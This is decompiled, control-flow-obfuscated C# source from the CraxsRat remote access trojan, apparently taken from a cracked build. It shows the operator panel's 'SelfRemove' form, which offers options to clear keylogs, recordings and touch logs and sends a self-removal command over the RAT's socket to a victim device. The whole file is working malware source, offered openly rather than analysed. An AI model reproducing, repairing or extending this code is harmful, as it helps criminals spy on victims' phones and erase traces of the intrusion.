// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.SelfRemove
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class SelfRemove : Form
  {
    public TcpClient Client;
    public Craxs_Rat.sockets.Client ScreenClass;
    public Craxs_Rat.sockets.Client classClient;
    public string DownloadsFolder;
    public string RecordName;
    public Size ScreenSize;
    public bool LIVE;
    public bool ScreenShotFoucs;
    public bool Recordit;
    public int Rnew;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.Label34 = new Label();
      this.Label1 = new Label();
      this.Label2 = new Label();
label_1:
      int num1 = -408247995;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~num1 * 1942423615 ^ 333311321 - -1941158608 - (1011483430 - 1310507052) - -~1531924082) + 1064562747 * ~364412453 ^ ~802315146)) % 69U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Label2.BackColor = Color.Transparent;
            num1 = (int) num2 * 791332462 ^ 354538733;
            continue;
          case 2:
            this.DrakeUIButtonIcon1.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1118048883 ^ 1265606524;
            continue;
          case 3:
            this.DrakeUIButtonIcon1 = new DrakeUIButtonIcon();
            num1 = (int) num2 * 1525860694 ^ -2136476165;
            continue;
          case 4:
            this.ShowIcon = false;
            num1 = (int) num2 * -1105105226 ^ 12860292;
            continue;
          case 5:
            this.Label34.Location = new Point(99, 143);
            num1 = (int) num2 * 1338671988 ^ 1565160498;
            continue;
          case 6:
            this.checktouch.Name = EXGuarder.\u003541D1621;
            num1 = (int) num2 * 174688010 ^ -641933039;
            continue;
          case 7:
            this.DrakeUIButtonIcon1.Symbol = 61546;
            this.DrakeUIButtonIcon1.TabIndex = 71;
            num1 = (int) num2 * -1790438047 ^ 2049003106;
            continue;
          case 8:
            this.checkrecords.Cursor = Cursors.Hand;
            this.checkrecords.Font = new Font(EXGuarder.\u0030B2D524F, 12f);
            num1 = (int) num2 * 1933906479 ^ 339051327;
            continue;
          case 9:
            this.Label2.AutoSize = true;
            num1 = (int) num2 * 58336273 ^ -2120540447;
            continue;
          case 10:
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            num1 = (int) num2 * -1626614983 ^ -1799381188;
            continue;
          case 11:
            this.checkrecords.TabIndex = 73;
            num1 = (int) num2 * 291031291 ^ -490902494;
            continue;
          case 12:
            this.clientpic.Location = new Point(120, 27);
            num1 = (int) num2 * 1975986321 ^ -963872546;
            continue;
          case 13:
            this.Controls.Add((Control) this.DrakeUIButtonIcon1);
            num1 = (int) num2 * -1728689028 ^ 160414960;
            continue;
          case 14:
            this.Label34.Font = new Font(EXGuarder.\u0030B2D524F, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 2084010095 ^ 972796975;
            continue;
          case 15:
            this.SuspendLayout();
            this.Label34.AutoSize = true;
            this.Label34.BackColor = Color.Transparent;
            num1 = (int) num2 * 1505282381 ^ -398770938;
            continue;
          case 16:
            this.Controls.Add((Control) this.Label34);
            num1 = (int) num2 * 817122257 ^ -435778672;
            continue;
          case 17:
            this.Label1.BackColor = Color.Transparent;
            this.Label1.Font = new Font(EXGuarder.\u0030B2D524F, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1107472854 ^ 495399292;
            continue;
          case 18:
            this.clientpic.TabStop = false;
            num1 = (int) num2 * 1227442663 ^ 735498268;
            continue;
          case 19:
            this.checkkeylogs.Font = new Font(EXGuarder.\u0030B2D524F, 12f);
            this.checkkeylogs.Location = new Point(22, 213);
            num1 = (int) num2 * -441407064 ^ -58391522;
            continue;
          case 20:
            this.checkkeylogs.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1370388807 ^ -1119403955;
            continue;
          case 21:
            this.clientpic.Name = EXGuarder.\u00322296F5F;
            this.clientpic.Size = new Size(97, 81);
            num1 = (int) num2 * -1125985787 ^ 37845087;
            continue;
          case 22:
            this.checktouch.Size = new Size(45, 29);
            this.checktouch.TabIndex = 75;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 72618834 ^ 1696363158;
            continue;
          case 23:
            this.checkrecords.Name = EXGuarder.\u003420B296A;
            this.checkrecords.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 1657099210 ^ -678499901;
            continue;
          case 24:
            this.checktouch.Location = new Point(22, 280);
            num1 = (int) num2 * -855193024 ^ -1554128654;
            continue;
          case 25:
            this.Text = EXGuarder.\u0032D1D4261;
            num1 = (int) num2 * 538883036 ^ -551560555;
            continue;
          case 26:
            this.BackColor = Color.Black;
            this.ClientSize = new Size(328, 424);
            this.Controls.Add((Control) this.checktouch);
            this.Controls.Add((Control) this.checkkeylogs);
            num1 = (int) num2 * -759000203 ^ 471959260;
            continue;
          case 27:
            this.checktouch.Cursor = Cursors.Hand;
            this.checktouch.Font = new Font(EXGuarder.\u0030B2D524F, 12f);
            num1 = (int) num2 * 1583040682 ^ -1034131928;
            continue;
          case 28:
            this.Controls.Add((Control) this.Label2);
            num1 = (int) num2 * -418420 ^ 126033884;
            continue;
          case 29:
            this.Label2.TabIndex = 70;
            num1 = (int) num2 * -1747831458 ^ 2060929757;
            continue;
          case 30:
            this.Label2.Text = EXGuarder.\u0030C750B15;
            num1 = (int) num2 * -330930293 ^ 45127290;
            continue;
          case 31:
            this.checkkeylogs.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * -141373695 ^ 631968056;
            continue;
          case 32:
            this.Label1.Text = EXGuarder.\u003426C4F1D;
            num1 = (int) num2 * 445416815 ^ -621448842;
            continue;
          case 33:
            this.checktouch = new DrakeUICheckBox();
            ((ISupportInitialize) this.clientpic).BeginInit();
            num1 = (int) num2 * -965206373 ^ -700818135;
            continue;
          case 34:
            this.clientpic.TabIndex = 72;
            num1 = (int) num2 * 1146984887 ^ 1018532381;
            continue;
          case 35:
            this.Label34.ForeColor = Color.White;
            num1 = (int) num2 * -816634077 ^ 1262055569;
            continue;
          case 36:
            this.Label1.Margin = new Padding(4, 0, 4, 0);
            this.Label1.Name = EXGuarder.\u003070D6032;
            num1 = (int) num2 * -966241137 ^ 232316562;
            continue;
          case 37:
            this.clientpic = new PictureBox();
            this.checkrecords = new DrakeUICheckBox();
            num1 = (int) num2 * -498789187 ^ 799339588;
            continue;
          case 38:
            this.checktouch.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 95306308 ^ -1041576143;
            continue;
          case 39:
            this.PerformLayout();
            num1 = (int) num2 * 349348041 ^ -686613771;
            continue;
          case 40:
            this.Label2.Size = new Size(202, 30);
            num1 = (int) num2 * -213470765 ^ 565000738;
            continue;
          case 41:
            this.checkkeylogs.TabIndex = 74;
            num1 = (int) num2 * -860572802 ^ 78942865;
            continue;
          case 42:
            this.checkrecords.Size = new Size(45, 29);
            num1 = (int) num2 * -619578023 ^ -1095414822;
            continue;
          case 43:
            this.DrakeUIButtonIcon1.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.DrakeUIButtonIcon1.Size = new Size(277, 35);
            this.DrakeUIButtonIcon1.Style = UIStyle.Custom;
            num1 = (int) num2 * -508604579 ^ -965598571;
            continue;
          case 44:
            this.checkrecords.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 1371809707 ^ 1791943286;
            continue;
          case 45:
            this.Label2.Location = new Point(99, 279);
            num1 = (int) num2 * -1421555779 ^ -1094683856;
            continue;
          case 46:
            this.Label1.AutoSize = true;
            num1 = (int) num2 * 219719772 ^ 1271150553;
            continue;
          case 47:
            this.Label1.ForeColor = Color.White;
            this.Label1.Location = new Point(99, 212);
            num1 = (int) num2 * -1819956325 ^ -1613063390;
            continue;
          case 48:
            this.Name = EXGuarder.\u0031A633342;
            num1 = (int) num2 * 544440503 ^ 723258752;
            continue;
          case 49:
            this.checktouch.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 234812484 ^ 1177511629;
            continue;
          case 50:
            this.checkrecords.Location = new Point(22, 144);
            num1 = (int) num2 * 406122177 ^ -108821871;
            continue;
          case 51:
            this.Label2.Font = new Font(EXGuarder.\u0030B2D524F, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.Label2.ForeColor = Color.White;
            num1 = (int) num2 * 1947740305 ^ 1568553702;
            continue;
          case 52:
            this.Label1.Size = new Size(200, 30);
            this.Label1.TabIndex = 68;
            num1 = (int) num2 * -1484043305 ^ 18693465;
            continue;
          case 53:
            this.Controls.Add((Control) this.Label1);
            num1 = (int) num2 * -1824436617 ^ 1300698440;
            continue;
          case 54:
            this.DrakeUIButtonIcon1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon1.Location = new Point(22, 359);
            this.DrakeUIButtonIcon1.Name = EXGuarder.\u00375392719;
            this.DrakeUIButtonIcon1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1860091349 ^ 1095301429;
            continue;
          case 55:
            this.checkkeylogs.Name = EXGuarder.\u0030B621142;
            this.checkkeylogs.Padding = new Padding(22, 0, 0, 0);
            this.checkkeylogs.Size = new Size(45, 29);
            num1 = (int) num2 * -2140156593 ^ 805792639;
            continue;
          case 56:
            this.Controls.Add((Control) this.checkrecords);
            this.Controls.Add((Control) this.clientpic);
            num1 = (int) num2 * -1416922924 ^ 1691203089;
            continue;
          case 57:
            goto label_1;
          case 58:
            this.Label34.Text = EXGuarder.\u00320410A5D;
            num1 = (int) num2 * 1800148156 ^ 64960003;
            continue;
          case 59:
            this.Label34.Size = new Size(205, 30);
            this.Label34.TabIndex = 66;
            num1 = (int) num2 * -326497341 ^ 1586079880;
            continue;
          case 60:
            this.ResumeLayout(false);
            num1 = (int) num2 * 1181778228 ^ 1686270206;
            continue;
          case 61:
            this.DrakeUIButtonIcon1.Text = EXGuarder.\u00322154A1F;
            num1 = (int) num2 * 811606482 ^ 195000781;
            continue;
          case 62:
            this.checkkeylogs = new DrakeUICheckBox();
            num1 = (int) num2 * -1588258927 ^ 234560708;
            continue;
          case 63:
            this.Label2.Margin = new Padding(4, 0, 4, 0);
            this.Label2.Name = EXGuarder.\u003770B6547;
            num1 = (int) num2 * -682671475 ^ 833669787;
            continue;
          case 64:
            this.Label34.Margin = new Padding(4, 0, 4, 0);
            this.Label34.Name = EXGuarder.\u00321492478;
            num1 = (int) num2 * -1690436645 ^ 787698117;
            continue;
          case 65:
            this.DrakeUIButtonIcon1.FillColor = Color.Black;
            num1 = (int) num2 * -720453285 ^ 633579080;
            continue;
          case 66:
            this.TopMost = true;
            ((ISupportInitialize) this.clientpic).EndInit();
            num1 = (int) num2 * 1970315476 ^ -298984801;
            continue;
          case 67:
            this.DrakeUIButtonIcon1.Font = new Font(EXGuarder.\u0030B2D524F, 12f);
            num1 = (int) num2 * -1269912610 ^ -1367915940;
            continue;
          case 68:
            this.clientpic.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * 1463094863 ^ -214977941;
            continue;
          default:
            goto label_71;
        }
      }
label_3:
      return;
label_71:;
    }

    internal virtual Label Label34
    {
      get => ((WebViewMonitor) this)._Label34;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((WebViewMonitor) this)._Label34 = value;
    }

    internal virtual Label Label1
    {
      get => ((WebViewMonitor) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((WebViewMonitor) this)._Label1 = value;
    }

    internal virtual Label Label2
    {
      get => ((WebViewMonitor) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((WebViewMonitor) this)._Label2 = value;
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((WebViewMonitor) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
        DrakeUIButtonIcon drakeUiButtonIcon1 = ((WebViewMonitor) this)._DrakeUIButtonIcon1;
label_1:
        int num1 = 1007456105;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((-num1 ^ (-(901570785 - 1052655504) ^ ~-1686141760 ^ 1210448283) - ~(-456754241 * (-1429392903 ^ 1897525687))) + 1961786257 * -~-192285471) * 694428071)) % 8U)
          {
            case 0:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num2 * 1339392102 ^ -764288283;
              continue;
            case 1:
              goto label_3;
            case 2:
              drakeUiButtonIcon1 = ((WebViewMonitor) this)._DrakeUIButtonIcon1;
              num1 = (int) num2 * -1374413137 ^ -322874695;
              continue;
            case 3:
              ((WebViewMonitor) this)._DrakeUIButtonIcon1 = value;
              num1 = -1832705706;
              continue;
            case 4:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num2 * 90843702 ^ 18365883;
              continue;
            case 5:
              int num3 = drakeUiButtonIcon1 == null ? 1467242564 : (num3 = 1333684115);
              num1 = num3 ^ (int) num2 * 1357785523;
              continue;
            case 6:
              goto label_1;
            case 7:
              int num4 = drakeUiButtonIcon1 == null ? 1669551683 : (num4 = 1323231838);
              num1 = num4 ^ (int) num2 * 1838179802;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual PictureBox clientpic
    {
      get => ((WebViewMonitor) this)._clientpic;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((WebViewMonitor) this)._clientpic = value;
      }
    }

    internal virtual DrakeUICheckBox checkrecords
    {
      get => ((WebViewMonitor) this)._checkrecords;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((WebViewMonitor) this)._checkrecords = value;
      }
    }

    internal virtual DrakeUICheckBox checkkeylogs
    {
      get => ((WebViewMonitor) this)._checkkeylogs;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((WebViewMonitor) this)._checkkeylogs = value;
      }
    }

    internal virtual DrakeUICheckBox checktouch
    {
      get => ((WebViewMonitor) this)._checktouch;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((WebViewMonitor) this)._checktouch = value;
      }
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      MsgBoxResult msgBoxResult = Interaction.MsgBox((object) EXGuarder.\u0034662433F, MsgBoxStyle.YesNo, (object) EXGuarder.\u003685E5C73);
      if (msgBoxResult == MsgBoxResult.Yes)
        goto label_8;
label_1:
      int num1 = -1768635590;
label_2:
      TcpClient client;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string str;
        int num4;
        string[] strArray;
        int num5;
        switch ((num3 = (uint) (~(-((-1392201135 ^ ~-(-1557411042 - -399934305) ^ -792380942 + (-122008814 ^ 122132847) ^ ~(78069985 - 988437542) ^ 1060559750) - num2) - 1239970983 * ---1920926994) - ~2042213026 - 1426460696)) % 16U)
        {
          case 0:
            str += EXGuarder.\u0034C33016C;
            num1 = (int) num3 * -943353672 ^ 1765065692;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((WebViewMonitor) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00357311174 + str + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num4) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num5) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031B446E77),
              (object) ((WebViewMonitor) this).Classclient
            });
            num1 = -1508250031;
            continue;
          case 2:
            int num6;
            num1 = num6 = !this.checktouch.Checked ? -2005185939 : (num6 = -1239198192);
            continue;
          case 3:
            num1 = (int) num3 * -1909680987 ^ 1649905790;
            continue;
          case 4:
            int num7 = msgBoxResult == MsgBoxResult.No ? 555576169 : (num7 = 1158698035);
            num1 = num7 ^ (int) num3 * 1780293622;
            continue;
          case 5:
            str += EXGuarder.\u00324110C38;
            num1 = (int) num3 * -1915894395 ^ 913405802;
            continue;
          case 6:
            num5 = 0;
            num1 = (int) num3 * -2133581738 ^ 825309138;
            continue;
          case 7:
            int num8 = !this.checkrecords.Checked ? 1457772768 : (num8 = 369090138);
            num1 = num8 ^ (int) num3 * -1806976187;
            continue;
          case 8:
            str = EXGuarder.\u00339214805;
            num1 = (int) num3 * -1366120616 ^ -632898553;
            continue;
          case 9:
            num4 = 0;
            num1 = (int) num3 * -1672361101 ^ 893699763;
            continue;
          case 10:
            goto label_1;
          case 11:
            int num9;
            num1 = num9 = !this.checkkeylogs.Checked ? -2037321252 : (num9 = -1197438834);
            continue;
          case 12:
            goto label_8;
          case 13:
            goto label_3;
          case 14:
            str += EXGuarder.\u0035E585642;
            num1 = (int) num3 * 787152127 ^ -898337361;
            continue;
          case 15:
            strArray = ((Data) ((WebViewMonitor) this).Classclient).Keys.Split(':');
            num1 = (int) num3 * -532069039 ^ 977368810;
            continue;
          default:
            goto label_18;
        }
      }
label_3:
      return;
label_18:
      return;
label_8:
      // ISSUE: reference to a compiler-generated field
      client = ((Data._Closure\u0024__) ((WebViewMonitor) this).Classclient).myClient;
      num1 = -1001967937;
      goto label_2;
    }

    private void translateme()
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u0035B0D1A59, false) == 0)
        goto label_7;
label_1:
      int num1 = 141364488;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 + (1517024901 * 60455861 ^ -(1992447531 - 329704353 ^ -1014543610 ^ 1573608978) ^ -1142103425 ^ --1882369613 + -946592487) ^ -((687760625 - 1102051714) * -1168429801 - (1483774281 * -1242922967 ^ -881523851 - -153591130)) ^ -(290767368 * -762933921) ^ 1234973275 - 2006425292 ^ --1511512398 ^ -830469428 - 578174529) * -883427251)) % 8U)
        {
          case 0:
            goto label_3;
          case 1:
            int num3 = Operators.CompareString(language, EXGuarder.\u0032805736B, false) != 0 ? 719134980 : (num3 = -899837171);
            num1 = num3 ^ (int) num2 * -1270606375;
            continue;
          case 2:
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u0033E6C6929, EXGuarder.\u003264D4E19);
            this.Label34.Text = Codes.Translate(this.Label34.Text, EXGuarder.\u0033E6C6929, EXGuarder.\u003264D4E19);
            num1 = (int) num2 * -164453387 ^ 1705558223;
            continue;
          case 3:
            this.Label34.Text = Codes.Translate(this.Label34.Text, EXGuarder.\u0033E6C6929, EXGuarder.\u0033F247609);
            num1 = (int) num2 * 48472184 ^ 999719965;
            continue;
          case 4:
            goto label_7;
          case 5:
            this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u0033E6C6929, EXGuarder.\u003264D4E19);
            num1 = (int) num2 * -386916964 ^ 1871821031;
            continue;
          case 6:
            goto label_1;
          case 7:
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u0033E6C6929, EXGuarder.\u0033F247609);
            num1 = (int) num2 * -297138508 ^ 913006314;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_7:
      this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u0033E6C6929, EXGuarder.\u0033F247609);
      num1 = 2137832242;
      goto label_2;
    }

    private void SelfRemove_Load(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      this.clientpic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((WebViewMonitor) this).Classclient).Wallpaper;
    }

    public SelfRemove()
    {
label_1:
      int num1 = 1962603023;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-((1161907130 ^ -964248730 ^ 1606581905 * 1369942860) - (-~num2 - ~(1769310445 * ~-562231273))) - 307920169)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            ((Updater) this).InitializeComponent();
            num1 = (int) num3 * -1608365280 ^ -531966452;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 614793773;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-(~-425474586 - (~-(--2126235611 - 1506855177) - (num2 - ~-((-478145979 ^ -684883610) - 243184707)))) * -1637162683)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((WebViewMonitor) this).components.Dispose();
              num1 = (int) num3 * 228694590 ^ 1838602638;
              continue;
            case 2:
              int num4 = ((WebViewMonitor) this).components == null ? 1614623302 : (num4 = -1093898380);
              num1 = num4 ^ (int) num3 * 506631595;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
